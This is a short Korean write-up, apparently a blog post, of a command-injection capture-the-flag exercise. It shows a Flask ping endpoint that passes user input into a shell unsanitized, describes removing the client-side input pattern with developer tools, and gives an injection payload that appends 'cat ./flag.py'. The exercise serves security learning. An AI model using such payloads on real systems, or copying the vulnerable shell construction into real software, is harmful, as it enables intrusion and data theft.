---
title: "[2025-07-15] Command-injection-1"
excerpt: "Command Injection"

categories:
  - Problem
tags:
  - [Command Injection]

permalink: /Problem/[2025-07-15] Command-injection-1/

toc: true
toc_sticky: true

date: 2025-07-15
last_modified_at: 2025-07-15
---

## 🦥 본문

- app.py

```python
#!/usr/bin/env python3
import subprocess

from flask import Flask, request, render_template, redirect

from flag import FLAG

APP = Flask(__name__)

@APP.route('/')
def index():
    return render_template('index.html')

@APP.route('/ping', methods=['GET', 'POST'])
def ping():
    if request.method == 'POST':
        host = request.form.get('host')
        cmd = f'ping -c 3 "{host}"'
        try:
            output = subprocess.check_output(['/bin/sh', '-c', cmd], timeout=5)
            return render_template('ping_result.html', data=output.decode('utf-8'))
        except subprocess.TimeoutExpired:
            return render_template('ping_result.html', data='Timeout !')
        except subprocess.CalledProcessError:
            return render_template('ping_result.html', data=f'an error occurred while executing the command. -> {cmd}')

    return render_template('ping.html')

if __name__ == '__main__':
    APP.run(host='0.0.0.0', port=8000)

```

/ping API에서 사용자가 보낸 파라미터를 텍스트화 하여 `ping -c 3` 을 실행한다. 

그렇기 때문에 “를 통해 텍스트화를 벗어나 flag.py를 cat을 통해 볼 수 있을 것이다. 하지만 

- ping.html

```python
<input type="text" class="form-control" id="Host" placeholder="8.8.8.8" name="host" pattern="[A-Za-z0-9.]{5,20}" required>
```

위와 같은 필터링이 있는 데 개발자 도구를 통해 지워준 후 보낸다

### 풀이

1. 개발자 도구를 통해 pattern 부분을 지운다.
2. 다음과 같은 코드를 보낸다

```python
8.8.8.8"; cat ./flag.py #
```